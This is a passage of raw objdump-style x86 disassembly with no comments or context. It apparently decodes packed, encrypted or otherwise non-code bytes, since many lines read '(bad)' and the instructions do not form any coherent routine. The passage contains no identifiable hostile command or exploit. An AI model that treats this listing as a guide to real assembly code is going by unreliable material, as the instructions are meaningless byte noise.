  48b949:	pop    ebx
  48b94a:	pop    ds
  48b94b:	xor    ebp,DWORD PTR ds:0xffdc8636
  48b951:	xor    DWORD PTR [edi-0x3ea3b726],ebp
  48b957:	push   ss
  48b958:	mov    edi,0x9dc1a339
  48b95d:	dec    ebx
  48b95e:	scas   al,BYTE PTR es:[edi]
  48b95f:	pop    edi
  48b960:	ss inc esp
  48b962:	pop    edi
  48b963:	inc    edi
  48b964:	(bad)  
  48b965:	imul   ebx,DWORD PTR ds:0x1f32bbeb,0x44
  48b96c:	jmp    0x48b9c6
  48b96e:	mov    es,WORD PTR [eax]
  48b970:	aas    
  48b971:	cmp    DWORD PTR [edi+0x14],edi
  48b974:	pop    es
  48b975:	jmp    0x48b9f1
  48b977:	fwait
  48b978:	jg     0x48b985
  48b97a:	fist   WORD PTR [esi-0x4b]
  48b97d:	pop    ebp
  48b97e:	xor    al,BYTE PTR [edx+0x31]
  48b981:	fistp  QWORD PTR [edi+0x3adc1708]
  48b987:	lahf   
  48b988:	scas   al,BYTE PTR es:[edi]
  48b989:	adc    edi,DWORD PTR [eax]
  48b98b:	lock mov dh,0x54
  48b98e:	add    al,0x87
  48b990:	fist   WORD PTR [edi]
  48b992:	or     DWORD PTR [edi],0x6a
  48b995:	daa    
  48b996:	pop    ebx
  48b997:	pop    DWORD PTR [ebx+0x56]
  48b99a:	sbb    BYTE PTR [edi-0x38a4c1c8],dl
  48b9a0:	lods   eax,DWORD PTR ds:[esi]
  48b9a1:	and    cl,al
  48b9a3:	mov    bh,BYTE PTR [edi-0x1]
  48b9a6:	aas    
  48b9a7:	cli    
  48b9a8:	and    bl,BYTE PTR [esi]
  48b9aa:	or     eax,0xb83ca397
  48b9af:	xchg   BYTE PTR [ebx+0x5f],ah
  48b9b2:	xor    BYTE PTR [edi],bl
  48b9b4:	inc    ebp
  48b9b5:	lahf   
  48b9b6:	inc    edx
  48b9b7:	mov    ds:0x1f706caf,al
  48b9bc:	jg     0x48b9d1
  48b9be:	jg     0x48b953
  48b9c0:	imul   eax,DWORD PTR [ebx+0xe],0x1134df31
  48b9c7:	pusha  
  48b9c8:	and    eax,0x9f347e15
  48b9cd:	push   esp
  48b9ce:	test   al,0xdb
  48b9d0:	xor    BYTE PTR [ebx],dh
  48b9d2:	jmp    FWORD PTR [ebx+0x6a847733]
  48b9d8:	inc    ecx
  48b9d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48b9da:	jb     0x48b9ab
  48b9dc:	mov    ebx,DWORD PTR [ebp+0x1b]
  48b9df:	inc    ecx
  48b9e0:	cmp    edi,0xffffffff
  48b9e3:	ss dec ecx
  48b9e5:	inc    edx
  48b9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48b9e7:	mov    bl,0x67
  48b9e9:	or     ah,BYTE PTR [eax+0x3]
  48b9ec:	hlt    
  48b9ed:	mov    edi,0x1dc21b07
  48b9f2:	or     ebx,esi
  48b9f4:	(bad)  
  48b9f5:	push   DWORD PTR [edi]
  48b9f7:	xor    eax,0x2c1620ac
  48b9fc:	xchg   edi,edi
  48b9fe:	mov    bl,0xe1
  48ba00:	sub    eax,0xb69e5845
  48ba05:	inc    ecx
  48ba06:	pop    edi
  48ba07:	mov    al,0xaa
  48ba09:	jne    0x48b9ed
  48ba0b:	pop    ds
  48ba0c:	lahf   
  48ba0d:	call   DWORD PTR [ebx+0x38]
  48ba10:	jp     0x48ba12
  48ba12:	xchg   edi,ebx
  48ba14:	adc    BYTE PTR [eax],ah
  48ba16:	push   ebp
  48ba17:	loopne 0x48b9c4
  48ba19:	pop    edi
  48ba1a:	jmp    FWORD PTR [ebx]
  48ba1c:	fnsave [ebx-0x7c24c822]
  48ba22:	ret    0x48db
  48ba25:	shl    bh,1
  48ba27:	test   bh,dh
  48ba29:	pop    ss
  48ba2a:	xor    al,BYTE PTR [edi]
  48ba2c:	shl    dl,cl
  48ba2e:	mov    ch,0xdb
  48ba30:	jbe    0x48ba69
  48ba32:	aas    
  48ba33:	rcl    dh,1
  48ba35:	xor    eax,0x3f35df04
  48ba3a:	(bad)  
  48ba3c:	xchg   esi,eax
  48ba3d:	daa    
  48ba3e:	and    dh,bh
  48ba40:	xor    cl,BYTE PTR [edi-0x730e29cb]
  48ba46:	not    DWORD PTR [edi+0x32]
  48ba49:	aas    
  48ba4a:	xchg   ebx,eax
  48ba4b:	lahf   
  48ba4c:	mov    dh,0xdd
  48ba4e:	push   ds
  48ba4f:	mov    ebx,0x31977a43
  48ba54:	mov    ds:0x6340adbf,eax
  48ba59:	test   dl,dh
  48ba5b:	(bad)  
  48ba5c:	adc    DWORD PTR [eax-0x242053c3],ecx
  48ba62:	fild   WORD PTR [esi+eax*4-0x200d13ef]
  48ba69:	fild   WORD PTR [ebx-0x39]
  48ba6c:	mov    edx,0x37df8f09
  48ba71:	add    eax,0xff268ac0
  48ba76:	add    edx,DWORD PTR [ebx]
  48ba78:	push   ss
  48ba79:	pusha  
  48ba7a:	mov    cl,0x3f
  48ba7c:	pop    ds
  48ba7d:	lahf   
  48ba7e:	popa   
  48ba7f:	bnd jo 0x48baf1
  48ba82:	(bad)  
  48ba83:	cs call 0x7f31:0xbbebb932
  48ba8b:	ds pop edi
  48ba8d:	inc    ebp
  48ba8e:	aas    
  48ba8f:	xor    eax,0x31eaa31
  48ba94:	jb     0x48ba35
  48ba96:	ds (bad) 
  48ba98:	fiadd  WORD PTR [edi+ebx*1+0x39]
  48ba9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ba9d:	lahf   
  48ba9e:	imul   ebp,DWORD PTR [ecx-0x7c],0xffffffb5
  48baa2:	adc    DWORD PTR [edx],eax
  48baa4:	lahf   
  48baa5:	jg     0x48bade
  48baa7:	ins    DWORD PTR es:[edi],dx
  48baa8:	rol    DWORD PTR [ecx+0x34df3409],cl
  48baae:	imul   eax,eax,0xffffffba
  48bab1:	mov    al,0xe0
  48bab3:	stos   DWORD PTR es:[edi],eax
  48bab4:	mov    edi,0x6e28c47f
  48bab9:	cmp    BYTE PTR [edi+0x71ff34eb],bl
  48babf:	loope  0x48bad1
  48bac1:	cmp    BYTE PTR [edi],bh
  48bac3:	pop    ds
  48bac4:	inc    DWORD PTR [esi-0x2045a3d2]
  48baca:	ss inc edx
  48bacc:	jg     0x48bb07
  48bace:	enter  0x2157,0x17
  48bad2:	arpl   di,bx
  48bad4:	inc    ecx
  48bad5:	add    BYTE PTR [ecx],bh
  48bad7:	push   ss
  48bad8:	or     al,0x2
  48bada:	dec    esp
  48badb:	cmp    BYTE PTR [edi+0x461ce007],bl
  48bae1:	add    DWORD PTR [edi-0x475d791d],ebx
  48bae7:	inc    edx
  48bae8:	lods   al,BYTE PTR ds:[esi]
  48bae9:	pop    edi
  48baea:	jg     0x48bb24
  48baec:	pop    ds
  48baed:	pop    es
  48baee:	mov    bh,0xae
  48baf0:	sar    esi,1
  48baf2:	inc    esi
  48baf4:	add    ebx,eax
  48baf6:	push   ss
  48baf7:	sbb    eax,0xffff0318
  48bafc:	shl    BYTE PTR [eax+ebp*4-0x62],0xfa
  48bb01:	fbstp  TBYTE PTR [edi]
  48bb03:	or     al,0x36
  48bb05:	push   esp
  48bb06:	jecxz  0x48bb67
  48bb08:	lahf   
  48bb09:	inc    esi
  48bb0a:	lahf   
  48bb0b:	ret    0xde05
  48bb0e:	sub    edi,DWORD PTR [edi+0x43]
  48bb11:	lahf   
  48bb12:	fist   WORD PTR [eax-0x74c3e1e5]
  48bb18:	inc    edx
  48bb19:	sub    eax,DWORD PTR [edx+0x3f]
  48bb1c:	inc    ebp
  48bb1d:	test   eax,0xae316c70
  48bb22:	jg     0x48bb5d
  48bb24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48bb25:	dec    eax
  48bb26:	pop    ds
  48bb27:	sub    edi,DWORD PTR [eax+0x7f]
  48bb2a:	call   DWORD PTR [ebx+0x2224693b]
  48bb30:	test   DWORD PTR [edi+0xc523ef5],0xebf3f7f
  48bb3a:	jl     0x48bba9
  48bb3c:	sub    ebx,DWORD PTR [edi+0x3f]
  48bb3f:	cmp    ebx,DWORD PTR [edi]
  48bb41:	xor    BYTE PTR [edx+eax*4-0x4b],ch
  48bb45:	(bad)  
  48bb46:	fild   WORD PTR [ebp-0x68]
  48bb49:	fdiv   QWORD PTR [ecx]
  48bb4b:	inc    ecx
  48bb4c:	fbstp  TBYTE PTR ds:0xeb5a09f
  48bb52:	imul   eax,edi,0xaad6d417
  48bb58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48bb59:	idiv   DWORD PTR [eax]
  48bb5b:	xchg   esp,eax
  48bb5c:	dec    ebx
  48bb5d:	xor    DWORD PTR [edx],eax
  48bb5f:	lahf   
  48bb60:	fisttp DWORD PTR [edi+0x4f3d4e45]
  48bb66:	xor    al,BYTE PTR [ebx-0x762f61ca]
  48bb6c:	aad    0x92
  48bb6e:	inc    ecx
  48bb6f:	ficomp DWORD PTR [edi-0x7be71b68]
  48bb75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48bb76:	ss xor eax,edx
  48bb79:	sub    BYTE PTR [ecx-0x28],dl
  48bb7c:	das    
  48bb7d:	outs   dx,DWORD PTR ds:[esi]
  48bb7e:	aaa    
  48bb7f:	add    DWORD PTR [eax-0x6880e8b0],0x7248000e
  48bb89:	inc    esp
  48bb8a:	daa    
  48bb8b:	mov    ch,0xaa
  48bb8d:	or     eax,0x9251c7ad
  48bb92:	sub    eax,DWORD PTR [edx-0x2d38b969]
  48bb98:	stos   BYTE PTR es:[edi],al
  48bb99:	ss xor eax,0x5a9ce733
  48bb9f:	mov    ch,0x3
  48bba1:	xchg   edi,eax
  48bba2:	cmp    esp,DWORD PTR [edi]
  48bba4:	push   esi
  48bba5:	shl    DWORD PTR ds:0xf760f58,0x83
  48bbac:	push   eax
  48bbad:	aam    0x81
  48bbaf:	arpl   WORD PTR [edi+0x17],di
  48bbb2:	pop    ss
  48bbb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48bbb4:	(bad)  
  48bbb5:	xor    cl,bh
  48bbb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48bbb8:	inc    ecx
  48bbb9:	or     al,BYTE PTR [eax]
  48bbbb:	and    al,cl
  48bbbd:	add    BYTE PTR [edi],dh
  48bbbf:	dec    edi
  48bbc0:	mov    ch,0x50
  48bbc2:	and    ecx,edi
  48bbc4:	xor    al,0x0
  48bbc6:	inc    esp
  48bbc7:	jg     0x48bb54
  48bbc9:	adc    eax,0x87f7906c
  48bbce:	das    
  48bbcf:	ret    
  48bbd0:	pop    edx
  48bbd1:	xchg   ecx,eax
  48bbd2:	lods   eax,DWORD PTR ds:[esi]
  48bbd3:	fbstp  TBYTE PTR [ebp-0x2853b7d6]
  48bbd9:	pop    es
  48bbda:	(bad)  
  48bbdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48bbdc:	(bad)  
  48bbdd:	mov    dl,BYTE PTR [edi+0x687c301f]
  48bbe3:	mov    al,0x5b
  48bbe5:	scas   eax,DWORD PTR es:[edi]
  48bbe6:	shr    BYTE PTR [edi+0x1c],cl
  48bbe9:	add    eax,0x5bf72cd2
  48bbee:	cmp    BYTE PTR [ebp+0x78],ah
  48bbf1:	arpl   WORD PTR [edi+edx*2],si
  48bbf4:	aas    
  48bbf5:	fld    QWORD PTR [edx+0x42]
  48bbf8:	call   0x86a:0xe2f454e
  48bbff:	sbb    BYTE PTR [edi+0x35],ah
  48bc02:	shr    BYTE PTR [edx-0x1ef0ff37],cl
  48bc08:	adc    DWORD PTR [eax],ecx
  48bc0a:	fld    QWORD PTR [edi+0x33]
  48bc0d:	and    al,0x8e
  48bc0f:	or     BYTE PTR [esi-0x6d],bh
  48bc12:	xor    al,0x1f
  48bc14:	inc    ebx
  48bc15:	mov    BYTE PTR ds:0x44071413,dl
  48bc1b:	mov    ebx,0x3e03c231
  48bc20:	push   edi
  48bc21:	push   edi
  48bc22:	cli    
  48bc23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48bc24:	xor    dh,BYTE PTR [eax+ebp*2+0x62]
  48bc28:	mov    edi,0x26814146
  48bc2d:	adc    DWORD PTR [ebx+0x3620c4b7],ebp
  48bc33:	xchg   esp,eax
  48bc34:	xor    cl,BYTE PTR [edi]
  48bc36:	adc    esi,DWORD PTR [ecx]
  48bc38:	push   es
  48bc39:	pxor   mm1,QWORD PTR [esi]
  48bc3c:	lahf   
  48bc3d:	inc    ebx
  48bc3e:	bound  ebx,QWORD PTR [ebx+0x45]
  48bc41:	add    dl,BYTE PTR [edi]
  48bc43:	pop    ds
  48bc44:	lds    ebx,FWORD PTR [edx]
  48bc46:	icebp  
  48bc47:	xchg   ebp,eax
  48bc48:	sbb    edx,ebx
  48bc4a:	pop    edi
  48bc4b:	dec    edi
  48bc4c:	push   ecx
  48bc4d:	loop   0x48bc57
  48bc4f:	outs   dx,BYTE PTR ds:[esi]
  48bc50:	loop   0x48bbf1
  48bc52:	inc    ecx
  48bc53:	aas    
  48bc54:	rcl    BYTE PTR [edx-0xbdcec7],1
  48bc5a:	cmp    DWORD PTR [ebx+0x3f156335],eax
  48bc60:	pop    edi
  48bc61:	test   ebp,0xbfb03158
  48bc67:	inc    ecx
  48bc68:	pop    ss
  48bc69:	aas    
  48bc6a:	daa    
  48bc6b:	sbb    BYTE PTR [edx+ebp*2],bh
  48bc6e:	(bad)  
  48bc6f:	imul   ebx,DWORD PTR [edi],0x3d
  48bc72:	inc    eax
  48bc73:	out    dx,eax
  48bc74:	int3   
  48bc75:	inc    ebp
  48bc76:	sub    dl,bl
  48bc78:	inc    edi
  48bc79:	pop    ebx
  48bc7a:	adc    DWORD PTR [ebp-0x2e],0x7fff8b6a
  48bc81:	cmp    BYTE PTR [ebp-0xbd8916],ch
  48bc87:	inc    edx
  48bc88:	aaa    
  48bc89:	pop    edi
  48bc8a:	and    al,0x6
  48bc8c:	fld    QWORD PTR [esi]
  48bc8e:	lahf   
  48bc8f:	outs   dx,BYTE PTR ds:[esi]
  48bc90:	aas    
  48bc91:	(bad)  
  48bc92:	sti    
  48bc93:	mov    eax,ds:0x3543870b
  48bc98:	shl    eax,cl
  48bc9a:	loope  0x48bc36
  48bc9c:	mov    eax,0xb4df9727
  48bca1:	mov    esp,0x629f36b1
  48bca6:	sbb    al,BYTE PTR [edx+0x68]
  48bca9:	xchg   ebx,eax
  48bcaa:	xor    eax,0x428bbf18
  48bcaf:	pop    es
  48bcb0:	into   
  48bcb1:	jno    0x48bcf2
  48bcb3:	inc    ebp
  48bcb4:	pop    edi
  48bcb5:	jb     0x48bd32
  48bcb7:	dec    edi
  48bcb8:	xchg   esi,eax
  48bcb9:	jecxz  0x48bc42
  48bcbb:	pop    ds
  48bcbc:	inc    esi
  48bcbd:	test   DWORD PTR [esp+edi*2],edi
  48bcc0:	(bad)  
  48bcc1:	(bad)  [ecx]
  48bcc3:	xor    al,BYTE PTR ds:[esi+0x31c1726d]
  48bcca:	pop    edi
  48bccb:	aaa    
  48bccc:	aaa    
  48bccd:	pop    edi
  48bcce:	add    edx,DWORD PTR [edx+eax*1+0x178f39ba]
  48bcd5:	mov    al,ds:0x3f6d6875
  48bcda:	fbstp  TBYTE PTR [eax+ebp*8]
  48bcdd:	push   cs
  48bcde:	(bad)  
  48bcdf:	jg     0x48bc84
  48bce1:	call   0x5608:0x1617e47f
  48bce8:	fbstp  TBYTE PTR [ecx]
  48bcea:	jo     0x48bcf5
  48bcec:	sbb    al,0xac
  48bcee:	xor    eax,DWORD PTR [edi]
  48bcf0:	pop    ss
  48bcf1:	pop    eax
  48bcf2:	xchg   DWORD PTR [esi],edi
  48bcf4:	aas    
  48bcf5:	jg     0x48bc96
  48bcf7:	imul   ebx,DWORD PTR [ebp+0x58],0x7fbf4688
  48bcfe:	rol    BYTE PTR [ebx-0x44],1
  48bd01:	daa    
  48bd02:	mov    bl,0x9b
  48bd04:	pop    ds
  48bd05:	xor    esi,DWORD PTR [esi+0x49]
  48bd08:	inc    eax
  48bd09:	mov    ds:0x4c9563ff,al
  48bd0e:	push   ecx
  48bd0f:	call   0x1679dc9e
  48bd14:	fnstcw WORD PTR [edx]
  48bd16:	cmp    BYTE PTR [edi+0x36],0xa7
  48bd1a:	lods   al,BYTE PTR ds:[esi]
  48bd1b:	rol    eax,cl
  48bd1d:	xchg   DWORD PTR [edi-0x11],edi
  48bd20:	or     eax,0x9f341cb9
  48bd25:	xor    eax,0x2d01bb35
  48bd2a:	or     bh,BYTE PTR [edi-0x751bda3d]
  48bd30:	inc    edx
  48bd31:	mov    edi,0xb0586031
  48bd36:	and    bh,BYTE PTR [edi+0x3972df07]
  48bd3c:	dec    eax
  48bd3d:	ds inc ebp
  48bd3f:	add    BYTE PTR [edx],dh
  48bd41:	cmp    DWORD PTR ds:0x1d8b083c,esi
  48bd47:	cmp    BYTE PTR [edi],bh
  48bd49:	inc    edi
  48bd4a:	add    DWORD PTR [ecx],esp
  48bd4c:	mov    cs,WORD PTR [ebx-0x1]
  48bd4f:	lahf   
  48bd50:	sar    BYTE PTR [eax],1
  48bd52:	xor    BYTE PTR ds:0x5c0c8f67,0x13
  48bd59:	jmp    0x48bdda
  48bd5b:	mov    ds:0x95605878,eax
  48bd60:	iret   
  48bd61:	push   ds
  48bd62:	pop    es
  48bd63:	lods   eax,DWORD PTR ds:[esi]
  48bd64:	push   cs
  48bd65:	outs   dx,BYTE PTR ds:[esi]
  48bd66:	add    eax,0xfeff169f
  48bd6b:	mov    DWORD PTR [ebp+0x71],eax
  48bd6e:	or     eax,0x6b707f4f
  48bd73:	cli    
  48bd74:	pop    eax
  48bd75:	mov    edi,0xb9933f1b
  48bd7a:	jo     0x48bdec
  48bd7c:	in     al,dx
  48bd7d:	fistp  WORD PTR [edi]
  48bd7f:	inc    edx
  48bd80:	fild   WORD PTR [esi+0xb]
  48bd83:	lock xchg esp,eax
  48bd85:	ss rep stos DWORD PTR es:[edi],eax
  48bd88:	mov    dl,0x56
  48bd8a:	or     eax,0x337f08b7
  48bd8f:	inc    DWORD PTR [eax]
  48bd91:	les    ecx,FWORD PTR fs:[edx]
  48bd94:	jg     0x48be0d
  48bd96:	ins    DWORD PTR es:[edi],dx
  48bd97:	mov    al,0x82
  48bd99:	stos   DWORD PTR es:[edi],eax
  48bd9a:	sbb    eax,DWORD PTR [ebx+0x1f]
  48bd9d:	mov    ds:0xbee3ad8b,al
  48bda2:	lods   al,BYTE PTR ds:[esi]
  48bda3:	outs   dx,DWORD PTR ds:[esi]
  48bda4:	add    bl,BYTE PTR [edi]
  48bda6:	lea    ebx,[edx-0x5d]
  48bda9:	into   
  48bdaa:	push   DWORD PTR [esi-0x5ca90041]
  48bdb0:	push   ds
  48bdb1:	outs   dx,DWORD PTR ds:[esi]
  48bdb2:	pop    es
  48bdb3:	pop    edx
  48bdb4:	push   DWORD PTR [esi]
  48bdb6:	push   0x7e336bb
  48bdbb:	inc    DWORD PTR [ebp+esi*1+0x41e707e2]
  48bdc2:	lahf   
  48bdc3:	and    DWORD PTR [ebx+eiz*2+0x3],edx
  48bdc7:	push   ebx
  48bdc8:	jg     0x48be02
  48bdca:	inc    esp
  48bdcb:	in     al,0xa
  48bdcd:	iret   
  48bdce:	inc    ebx
  48bdcf:	(bad)  
  48bdd0:	iret   
  48bdd1:	(bad)  
  48bdd2:	stos   BYTE PTR es:[edi],al
  48bdd3:	xor    al,0xa2
  48bdd5:	pop    edi
  48bdd6:	(bad)  
  48bdd7:	jo     0x48bddc
  48bdd9:	in     al,0x60
  48bddb:	lahf   
  48bddc:	xor    DWORD PTR [edx],ebx
  48bdde:	aam    0x1a
  48bde0:	mov    al,0x8
  48bde2:	mov    edi,0x4e846cdf
  48bde7:	mov    ebp,0xb6bf410f
  48bdec:	lds    esp,FWORD PTR [edi]
  48bdee:	inc    esi
  48bdef:	ud0    edi,DWORD PTR [esi]
  48bdf2:	mov    bh,0x39
  48bdf4:	pop    edx
  48bdf5:	or     BYTE PTR [ebp+0x365e5396],bh
  48bdfb:	sbb    edi,DWORD PTR [ebx+0x2a9b2c4c]
  48be01:	push   esi
  48be02:	add    BYTE PTR [ebx+ecx*2+0x3f],bl
  48be06:	pop    ds
  48be07:	add    eax,0x5fde3706
  48be0c:	aas    
  48be0d:	cs xor eax,0xbfba4d5c
  48be13:	xor    edx,DWORD PTR [edi-0x3a4cf8f1]
  48be19:	mov    edi,ds
  48be1b:	fbstp  TBYTE PTR [edx]
  48be1d:	jae    0x48be03
  48be1f:	test   eax,0x38de1be4
  48be24:	xor    eax,0x335c3900
  48be29:	push   ss
  48be2a:	lods   eax,DWORD PTR ds:[esi]
  48be2b:	inc    ebx
  48be2c:	pop    edi
  48be2d:	inc    esi
  48be2e:	stos   BYTE PTR es:[edi],al
  48be2f:	mov    BYTE PTR [edx+0x4b5f0780],0x49
  48be36:	push   es
  48be37:	cmp    BYTE PTR fs:[ecx-0x6a],al
  48be3b:	mov    esp,0x5e27ee3b
  48be40:	stos   DWORD PTR es:[edi],eax
  48be41:	aaa    
  48be42:	xor    BYTE PTR ds:[ecx],cl
  48be45:	jmp    0x37f857d7
  48be4a:	mov    edi,0xe11c5245
  48be4f:	adc    al,BYTE PTR [edi]
  48be51:	jg     0x48be52
  48be53:	test   BYTE PTR [edx+ebx*2],bl
  48be56:	add    DWORD PTR [edi-0x31],eax
  48be59:	into   
  48be5a:	arpl   WORD PTR ds:0xff38dfd7,cx
  48be60:	daa    
  48be61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48be62:	push   esi
  48be63:	adc    eax,DWORD PTR [edx+0x7]
  48be66:	(bad)  
  48be68:	es pusha 
  48be6a:	rcl    DWORD PTR ds:0x4043bfdf,cl
  48be70:	push   ebx
  48be71:	bound  eax,QWORD PTR [ecx+0x3f]
  48be74:	jecxz  0x48bea9
  48be76:	mov    bl,0xd0
  48be78:	inc    esp
  48be79:	lods   al,BYTE PTR ds:[esi]
  48be7a:	pop    edi
  48be7b:	pop    edi
  48be7c:	out    0x43,eax
  48be7e:	adc    esp,DWORD PTR [ecx]
  48be80:	add    bl,BYTE PTR [ebx-0x69]
  48be83:	xchg   edi,eax
  48be84:	mov    BYTE PTR [ebx],al
  48be86:	add    al,BYTE PTR [edi]
  48be88:	inc    ebp
  48be89:	das    
  48be8a:	push   ebp
  48be8b:	xor    BYTE PTR [eax],dh
  48be8d:	adc    BYTE PTR [ebp-0x15],al
  48be90:	mov    al,0xc6
  48be92:	test   BYTE PTR [ebx-0x7ffc90f1],al
  48be98:	sbb    edx,DWORD PTR [ebp-0x31]
  48be9b:	push   ss
  48be9c:	daa    
  48be9d:	jnp    0x48bf17
  48be9f:	imul   edx,DWORD PTR [ebx],0x45
  48bea2:	inc    edi
  48bea3:	das    
  48bea4:	dec    edi
  48bea5:	dec    edi
  48bea6:	les    esi,FWORD PTR [ecx]
  48bea8:	outs   dx,BYTE PTR ds:[esi]
  48bea9:	sar    DWORD PTR [edi],0xae
  48beac:	pop    edi
  48bead:	and    BYTE PTR [esi+0x2b876d6c],ch
  48beb3:	bound  eax,QWORD PTR [edx]
  48beb5:	dec    eax
  48beb6:	or     eax,0xc1b13f07
  48bebb:	sbb    dh,BYTE PTR [ebp-0x651085f9]
  48bec1:	rol    DWORD PTR [esi+0x60],1
  48bec4:	idiv   ebx
  48bec6:	aaa    
  48bec7:	mov    ds:0x53d4d1b4,al
  48becc:	mov    WORD PTR [esi],gs
  48bece:	adc    DWORD PTR [ecx-0x4e9e6021],ebp
  48bed4:	mov    eax,0x2143cf2c
  48bed9:	mov    esp,0x414f12eb
  48bede:	inc    ebx
  48bedf:	pusha  
  48bee0:	adc    al,0x30
  48bee2:	mov    BYTE PTR [edi-0x31],ch
  48bee5:	ins    DWORD PTR es:[edi],dx
  48bee6:	push   ebp
  48bee7:	or     al,al
  48bee9:	lahf   
  48beea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48beeb:	ins    BYTE PTR es:[edi],dx
  48beec:	shr    BYTE PTR [esi],1
  48beee:	popa   
  48beef:	jecxz  0x48bf08
  48bef1:	dec    esi
  48bef2:	and    dl,BYTE PTR [esp+ebx*1-0x9]
  48bef6:	inc    edi
  48bef7:	das    
  48bef8:	pop    eax
  48bef9:	cmp    DWORD PTR gs:0xac76673f,ebp
  48bf00:	sbb    ch,BYTE PTR [ebx]
  48bf02:	(bad)  
  48bf03:	mov    bh,0xe7
  48bf05:	push   esi
  48bf06:	mov    ds:0xb21f005a,eax
  48bf0b:	dec    ebx
  48bf0c:	sahf   
  48bf0d:	and    ecx,DWORD PTR [eax]
  48bf0f:	aas    
  48bf10:	xor    edi,DWORD PTR [eax]
  48bf12:	rol    DWORD PTR [esi+0x6f],1
  48bf15:	add    eax,0xbf56bf2f
  48bf1a:	(bad)
  48bf1f:	outs   dx,DWORD PTR ds:[esi]
  48bf20:	inc    ecx
  48bf21:	scas   eax,DWORD PTR es:[edi]
  48bf22:	or     BYTE PTR [ebx+0x6e77dcad],ah
  48bf28:	ja     0x48bee0
  48bf2a:	mov    ch,0x10
  48bf2c:	ror    DWORD PTR [edx],0x37
  48bf2f:	not    DWORD PTR [ebx]
  48bf31:	pop    eax
  48bf32:	dec    esp
  48bf33:	sar    BYTE PTR ss:[edi-0x77394301],cl
  48bf3a:	sub    eax,0x46437f07
  48bf3f:	jbe    0x48beca
  48bf41:	sbb    BYTE PTR [edi+edi*1],dl
  48bf44:	pop    ds
  48bf45:	or     al,0x40
  48bf47:	adc    BYTE PTR [edx],ch
  48bf49:	push   edi
  48bf4a:	aas    
  48bf4b:	aaa    
  48bf4c:	sbb    DWORD PTR ds:0x3b1f4088,esp
  48bf52:	xor    al,0xdc
  48bf54:	lds    ebp,FWORD PTR [edx+0x7f3ad37f]
  48bf5a:	pop    eax
  48bf5b:	jb     0x48bf71
  48bf5d:	pop    esp
  48bf5e:	ss aas 
  48bf60:	inc    ecx
  48bf61:	inc    edx
  48bf62:	jo     0x48bfa5
  48bf64:	jmp    0x48bf85
  48bf66:	aaa    
  48bf67:	sbb    BYTE PTR [esp+edx*4],0x6
  48bf6b:	jg     0x48bfb2
  48bf6d:	add    DWORD PTR [esp+ebx*2-0x5a],ebx
  48bf71:	xlat   BYTE PTR ds:[ebx]
  48bf72:	xor    edi,DWORD PTR [eax]
  48bf74:	sbb    dl,BYTE PTR [esi+0x3]
  48bf77:	iret   
  48bf78:	jg     0x48bfaf
  48bf7a:	stos   BYTE PTR es:[edi],al
  48bf7b:	test   BYTE PTR ds:0x4d6f4fc3,dl
  48bf81:	pop    edx
  48bf82:	gs add eax,0x41fbf
  48bf88:	mov    esp,DWORD PTR [eax+0x252944f3]
  48bf8e:	xlat   BYTE PTR ds:[ebx]
  48bf8f:	xlat   BYTE PTR ds:[ebx]
  48bf90:	inc    ebp
  48bf91:	cmp    BYTE PTR [ebx+0x1],al
  48bf94:	push   esi
  48bf95:	inc    edi
  48bf96:	mov    bh,0x36
  48bf98:	and    ah,BYTE PTR [esi+0x7bf50b5]
  48bf9e:	xchg   ebx,eax
  48bf9f:	mov    al,0x5a
  48bfa1:	in     eax,dx
  48bfa2:	aaa    
  48bfa3:	(bad)  
  48bfa4:	fisubr DWORD PTR [edi+0x1a]
  48bfa7:	shl    BYTE PTR [eax],cl
  48bfa9:	inc    ebx
  48bfaa:	inc    esi
  48bfab:	inc    ecx
  48bfac:	rcl    edx,0x64
  48bfaf:	or     BYTE PTR [edi+0x39],0xa4
  48bfb3:	adc    eax,0x6f4fab0a
  48bfb8:	sub    esi,DWORD PTR [edx+edx*1]
  48bfbb:	xor    esi,DWORD PTR [edi]
  48bfbd:	iret   
  48bfbe:	and    ebp,DWORD PTR [ebp+0x5b6f022e]
  48bfc4:	pusha  
  48bfc5:	cmp    DWORD PTR [eax],ecx
  48bfc7:	mov    eax,ds:0x35a64117
  48bfcc:	call   0x692b:0x86f09
  48bfd3:	ss aaa 
  48bfd5:	(bad)  
  48bfd6:	fiadd  DWORD PTR [edx-0x68f8a830]
  48bfdc:	aam    0x36
  48bfde:	or     BYTE PTR [ebx+0x3f],0x4b
  48bfe2:	ret    0x20ba
  48bfe5:	lods   al,BYTE PTR ds:[esi]
  48bfe6:	push   edi
  48bfe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48bfe8:	push   esi
  48bfe9:	inc    ecx
  48bfea:	mov    eax,ds:0xade797cb
  48bfef:	dec    ax
  48bff1:	sub    eax,DWORD PTR [edi+0x37]
  48bff4:	sub    BYTE PTR [ecx+ebp*1-0x68c828d6],cl
  48bffb:	ss push es
  48bffd:	ins    DWORD PTR es:[edi],dx
  48bffe:	sbb    DWORD PTR [ecx],esi
  48c000:	(bad)  
  48c001:	cmp    BYTE PTR [eax-0x29],bl
  48c004:	loopne 0x48bffd
  48c006:	dec    edi
  48c007:	imul   edx,DWORD PTR [eax+0x6b],0x34
  48c00b:	pop    ecx
  48c00c:	out    dx,eax
  48c00d:	das    
  48c00e:	test   cl,dl
  48c010:	sub    BYTE PTR [edx+0x67],ch
  48c013:	push   esi
  48c014:	or     DWORD PTR [eax+0x13],ebx
  48c017:	out    0x77,eax
  48c019:	rol    BYTE PTR [esi-0x2b],1
  48c01c:	aam    0xf7
  48c01e:	cmp    DWORD PTR [edi+0x3e0a4647],eax
  48c024:	or     BYTE PTR [ebx-0x729ad7b9],0x0
  48c02b:	mov    edi,0xb4e2e07f
  48c030:	xor    bh,cl
  48c032:	inc    esi
  48c033:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48c034:	push   ebp
